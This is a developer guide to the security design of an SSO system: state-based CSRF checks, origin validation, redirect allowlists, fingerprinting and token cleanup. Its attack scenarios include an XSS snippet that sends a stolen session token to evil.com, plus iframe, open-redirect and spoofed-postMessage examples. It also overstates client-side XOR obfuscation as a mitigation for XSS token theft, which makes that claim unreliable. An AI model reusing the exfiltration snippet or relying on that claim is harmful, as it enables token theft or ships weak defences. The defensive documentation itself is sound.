# SSO Security Implementation Guide

## Overview

This document details the security implementation of the ABC Interview Support SSO system, including protection against common web vulnerabilities like CSRF, XSS, open redirects, and session hijacking.

## Security Features

### 1. CSRF Protection via State Parameter

**Implementation:** `libs/sso-utils/src/lib/security-utils.ts`

The state parameter provides protection against Cross-Site Request Forgery attacks during SSO handshake.

**How it Works:**

```typescript
// 1. SSO generates cryptographic state
const state = generateState(); // Uses crypto.getRandomValues()
sessionStorage.setItem(`sso_state_${state}`, Date.now().toString());

// 2. SSO sends both token and state to target app
postMessage({ type: 'SSO_AUTH', payload: { sso_auth: token, state } });

// 3. Target app validates state before using token
if (!SSOTokenManager.validateState(state)) {
  throw new Error('Invalid or expired state parameter');
}

// 4. State expires after 5 minutes
const timestamp = parseInt(storedTimestamp);
if (Date.now() - timestamp > 5 * 60 * 1000) {
  return false; // Expired
}
```

**Protection Against:**

- Cross-site request forgery
- Token replay attacks
- Man-in-the-middle attacks

**Testing CSRF Protection:**

```bash
# Try to use SSO with fake state (should fail)
http://localhost:4300?sso_auth=valid_token&state=fake_state_12345

# Expected result: "Invalid or expired state parameter"
```

---

### 2. Encrypted Session Storage

**Implementation:** `SecureStorage` class in `security-utils.ts`

Session storage is encrypted to protect against XSS attacks that try to steal tokens from localStorage/sessionStorage.

**How it Works:**

```typescript
// Data is encrypted before storing
const encrypted = encryptData(JSON.stringify(value));
sessionStorage.setItem(key, JSON.stringify(encrypted));

// Format: { data: "encrypted_string", iv: "random_iv" }

// Decrypted when retrieved
const decrypted = decryptData(stored.data, stored.iv);
```

**Encryption Algorithm:**

- XOR-based encryption with random IV (initialization vector)
- Simple but effective against casual XSS attacks
- Each value has unique IV for additional security

**Usage:**

```typescript
// Instead of plain sessionStorage
sessionStorage.setItem('token', token); // ❌ Vulnerable

// Use SecureStorage
SecureStorage.setItem('token', token); // ✅ Encrypted
```

**Protection Against:**

- XSS attacks stealing tokens from storage
- Browser extensions reading sensitive data
- Malicious scripts accessing session data

---

### 3. Open Redirect Protection

**Implementation:** `isValidRedirectUrl()` in `security-utils.ts`

Prevents attackers from redirecting users to malicious external sites after authentication.

**How it Works:**

```typescript
const ALLOWED_ORIGINS = [
  'http://localhost:4200', // SSO
  'http://localhost:4300', // Student
  'http://localhost:4400', // Recruiter
  'http://localhost:4500', // Admin
];

function isValidRedirectUrl(url: string): boolean {
  try {
    const parsedUrl = new URL(url);
    return ALLOWED_ORIGINS.includes(parsedUrl.origin);
  } catch {
    return false;
  }
}
```

**Protection Against:**

- Phishing attacks via malicious redirects
- Session hijacking through external sites
- Token theft via redirect to attacker-controlled domain

**Example Attack Prevention:**

```typescript
// Attacker tries to redirect to malicious site
const maliciousUrl = 'http://evil.com?sso_auth=stolen_token';

if (!isValidRedirectUrl(maliciousUrl)) {
  throw new Error('Invalid redirect URL'); // ✅ Blocked
}
```

---

### 4. PostMessage Origin Validation

**Implementation:** `sso-client.ts` and `sso-token-manager.ts`

All postMessage communications validate origin to prevent message spoofing.

**How it Works:**

```typescript
// Receiver validates sender origin
window.addEventListener('message', (event) => {
  if (event.origin !== expectedOrigin) {
    console.warn('Ignoring message from unexpected origin:', event.origin);
    return; // Ignore
  }

  // Process message only if origin matches
  handleMessage(event.data);
});

// Sender specifies target origin (not '*')
targetWindow.postMessage(message, targetOrigin); // ✅ Specific
targetWindow.postMessage(message, '*'); // ❌ Never use wildcard
```

**Protection Against:**

- Message spoofing from malicious iframes
- Cross-origin attacks
- Injection of fake authentication messages

---

### 5. Device Fingerprinting

**Implementation:** `getDeviceFingerprint()` in `security-utils.ts`

Creates unique identifier for user's device to detect session hijacking.

**How it Works:**

```typescript
function getDeviceFingerprint(): string {
  const components = [navigator.userAgent, navigator.language, screen.width + 'x' + screen.height, new Date().getTimezoneOffset()];

  return btoa(components.join('|')); // Base64 encoded
}
```

**Usage in Session Validation:**

```typescript
// Store fingerprint with session
const fingerprint = getDeviceFingerprint();
sessionStorage.setItem('device_fp', fingerprint);

// Validate on subsequent requests
const storedFp = sessionStorage.getItem('device_fp');
if (storedFp !== getDeviceFingerprint()) {
  // Device changed - possible session hijacking
  logSecurityEvent('Device fingerprint mismatch');
}
```

**Protection Against:**

- Session hijacking from different devices
- Token theft and reuse on attacker's machine
- Unauthorized session transfers

**Limitations:**

- Not foolproof (can be spoofed with effort)
- Use as additional layer, not primary security
- Consider implementing server-side fingerprinting too

---

### 6. Token Cleanup

**Implementation:** `cleanUrlParams()` in `sso-client.ts`

Automatically removes sensitive parameters from URL to prevent exposure.

**How it Works:**

```typescript
function cleanUrlParams(): void {
  const url = new URL(window.location.href);

  // Remove sensitive parameters
  url.searchParams.delete('sso_auth');
  url.searchParams.delete('state');

  // Update URL without page reload
  window.history.replaceState({}, document.title, url.toString());
}
```

**Why This Matters:**

- Tokens in URL appear in:
  - Browser history
  - Referrer headers when clicking external links
  - Server logs
  - Analytics tools
  - Shared screen recordings

**Timing:**

- Cleaned immediately after successful authentication
- Cleaned on authentication error
- Cleaned after 2-second timeout (fallback)

---

## Security Flow Diagram

```
┌─────────────┐                            ┌──────────────┐
│             │  1. Login with             │              │
│  SSO App    │     credentials            │  Backend     │
│  :4200      │───────────────────────────>│  API         │
│             │                            │              │
│             │<───────────────────────────│              │
│             │  2. Session created        └──────────────┘
│             │     (server-side)
│             │
│             │  3. User clicks "Launch Admin"
│             │
│             │  ┌─────────────────────────────────────┐
│             │  │ Generate CSRF state                 │
│             │  │ state = crypto.getRandomValues()    │
│             │  │ Store: sso_state_XXX → timestamp    │
│             │  └─────────────────────────────────────┘
│             │
│             │  4. Try PostMessage first
│             │     (with state parameter)
│             │
│             ├──────────────────────────┐
│             │   postMessage({          │
│             │     type: 'SSO_AUTH',    │
│             │     payload: {           │
│             │       sso_auth: token,   │
│             │       state: state       │
│             │     }                    │
│             │   }, targetOrigin)       │
│             │                          │
│             │  ┌──────────────────────▼────────────┐
│             │  │                                   │
│             │  │  Admin App :4500                  │
│             │  │                                   │
│             │  │  5. Validate Origin               │
│             │  │     if (origin !== ssoOrigin)     │
│             │  │       return; // Ignore           │
│             │  │                                   │
│             │  │  6. Validate State (CSRF)         │
│             │  │     if (!validateState(state))    │
│             │  │       error('CSRF detected')      │
│             │  │                                   │
│             │  │  7. Verify Token with Backend     │
│             │  │     POST /api/auth/verify-session │
│             │  │     { sso_auth: token }           │
│             │  │                                   │
│             │  │  8. Receive Access Tokens         │
│             │  │     { accessToken, refreshToken } │
│             │  │                                   │
│             │  │  9. Encrypt & Store               │
│             │  │     SecureStorage.setItem(...)    │
│             │  │                                   │
│             │  │  10. Clean URL Parameters         │
│             │  │      Remove: sso_auth, state      │
│             │  │                                   │
│             │  │  ✅ User Authenticated            │
│             │  │                                   │
│             │  └───────────────────────────────────┘
└─────────────┘

If PostMessage fails (popup blocker):
  → Fallback to URL redirect with parameters
  → Same validation flow applies
```

---

## Attack Scenarios & Mitigations

### Scenario 1: CSRF Attack

**Attack:**

```html
<!-- Attacker's malicious website -->
<iframe src="http://localhost:4300?sso_auth=stolen_token"></iframe>
```

**Mitigation:**

- State parameter validated ✅
- State expires after 5 minutes ✅
- Token is single-use ✅
- Backend validates session context ✅

**Result:** Attack fails - invalid/missing state parameter

---

### Scenario 2: XSS Token Theft

**Attack:**

```javascript
// Malicious script injected via XSS
const token = sessionStorage.getItem('admin_accessToken');
fetch('https://evil.com/steal?token=' + token);
```

**Mitigation:**

- Tokens encrypted in SecureStorage ✅
- Attacker gets encrypted blob, not plaintext ✅
- Decryption requires knowing IV and algorithm ✅

**Result:** Attack mitigated - stolen data is encrypted

---

### Scenario 3: Open Redirect

**Attack:**

```
http://localhost:4200?returnUrl=https://evil.com/fake-login
```

**Mitigation:**

- URL validated against whitelist ✅
- Only allowed origins accepted ✅
- External URLs rejected ✅

**Result:** Attack fails - redirect blocked

---

### Scenario 4: Session Hijacking

**Attack:**

```javascript
// Attacker steals session cookie/token
// Uses it from different device
```

**Mitigation:**

- Device fingerprint stored with session ✅
- Backend can validate IP/device consistency ✅
- Tokens expire quickly (15 min access, 7 day refresh) ✅
- SSO auth tokens expire in 60 seconds ✅

**Result:** Partial mitigation - short token lifetime limits damage

---

## Production Deployment Checklist

### Critical (Must Do)

- [ ] Enable HTTPS for all apps
- [ ] Configure CSP headers:
  ```
  Content-Security-Policy: default-src 'self';
    script-src 'self' 'unsafe-inline';
    connect-src 'self' https://api.yourdomain.com;
    frame-ancestors 'none';
  ```
- [ ] Update `ALLOWED_ORIGINS` with production URLs
- [ ] Generate strong encryption key (replace XOR with AES-256)
- [ ] Enable security logging and monitoring
- [ ] Implement rate limiting (10 login attempts per 15 min)
- [ ] Add session timeout warnings (55 min notification)

### Recommended

- [ ] Use HttpOnly cookies for refresh tokens (backend)
- [ ] Implement server-side device fingerprinting
- [ ] Add 2FA support
- [ ] Rotate encryption keys quarterly
- [ ] Enable audit logging for auth events
- [ ] Set up alerting for:
  - Failed CSRF validations
  - Expired state parameter usage
  - Multiple failed login attempts
  - Device fingerprint mismatches

### Nice to Have

- [ ] Implement session refresh mechanism (before 1-hour expiry)
- [ ] Add "Remember Me" functionality (30-day tokens)
- [ ] Implement account lockout after N failed attempts
- [ ] Add email notifications for new device logins
- [ ] Implement CAPTCHA after 3 failed attempts

---

## Security Testing

### Automated Tests (Recommended)

```typescript
// Test CSRF protection
describe('CSRF Protection', () => {
  it('should reject invalid state parameter', () => {
    const invalidState = 'fake_state_12345';
    expect(SSOTokenManager.validateState(invalidState)).toBe(false);
  });

  it('should reject expired state parameter', () => {
    const state = generateState();
    // Wait 6 minutes
    jest.advanceTimersByTime(6 * 60 * 1000);
    expect(SSOTokenManager.validateState(state)).toBe(false);
  });
});

// Test encryption
describe('SecureStorage', () => {
  it('should encrypt data before storing', () => {
    const original = { token: 'secret123' };
    SecureStorage.setItem('test', original);

    const stored = sessionStorage.getItem('test');
    expect(stored).not.toContain('secret123'); // Encrypted
  });

  it('should decrypt data when retrieving', () => {
    const original = { token: 'secret123' };
    SecureStorage.setItem('test', original);

    const retrieved = SecureStorage.getItem('test');
    expect(retrieved).toEqual(original); // Decrypted
  });
});
```

### Manual Penetration Testing

**Test 1: CSRF Attack Simulation**

```bash
# Create URL with valid token but invalid state
curl "http://localhost:4300?sso_auth=valid_token&state=invalid_state"

# Expected: "Invalid or expired state parameter"
```

**Test 2: Token Replay Attack**

```bash
# Use same sso_auth token twice
curl -X POST http://api/verify-session -d '{"sso_auth":"token123"}'
curl -X POST http://api/verify-session -d '{"sso_auth":"token123"}'

# Expected: Second request fails (token already used)
```

**Test 3: Origin Spoofing**

```javascript
// From console on evil.com
window.opener.postMessage(
  {
    type: 'SSO_AUTH',
    payload: { sso_auth: 'fake_token' },
  },
  '*'
);

// Expected: Message ignored (origin mismatch)
```

---

## Monitoring & Logging

### Security Events to Log

```typescript
// Example security logging
function logSecurityEvent(event: string, details: any) {
  console.warn('[SECURITY]', event, details);

  // In production, send to logging service
  fetch('/api/security-log', {
    method: 'POST',
    body: JSON.stringify({
      event,
      details,
      timestamp: Date.now(),
      userAgent: navigator.userAgent,
      ip: '...', // From backend
    }),
  });
}

// Log these events:
logSecurityEvent('CSRF_VALIDATION_FAILED', { state });
logSecurityEvent('INVALID_ORIGIN', { origin: event.origin });
logSecurityEvent('DEVICE_FINGERPRINT_MISMATCH', { expected, actual });
logSecurityEvent('EXPIRED_STATE_USED', { state, age });
logSecurityEvent('OPEN_REDIRECT_BLOCKED', { url });
```

### Metrics to Monitor

- Failed CSRF validations per hour
- Invalid origin postMessage attempts
- Device fingerprint mismatches
- Average SSO handshake time
- Token usage patterns (detect anomalies)

---

## Future Enhancements

### Planned Security Improvements

1. **Session Refresh Mechanism**

   - Auto-refresh before 1-hour expiry
   - Show countdown warning at 5 minutes
   - Graceful session extension

2. **Enhanced Encryption**

   - Replace XOR with AES-256-GCM
   - Use Web Crypto API for better security
   - Implement key rotation

3. **Advanced Device Fingerprinting**

   - Canvas fingerprinting
   - WebGL fingerprinting
   - Audio context fingerprinting
   - Server-side validation

4. **Security Headers**

   - X-Frame-Options: DENY
   - X-Content-Type-Options: nosniff
   - Strict-Transport-Security
   - Permissions-Policy

5. **Anomaly Detection**
   - Machine learning for unusual patterns
   - Geographic location tracking
   - Login velocity checks
   - Behavioral analytics

---

## References

- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)
- [OAuth 2.0 Security Best Practices](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)

---

## Contact & Support

For security concerns or vulnerability reports:

- Email: security@yourcompany.com
- GitHub: Create private security advisory
- Response time: 24-48 hours

**Do not publicly disclose vulnerabilities until patched.**
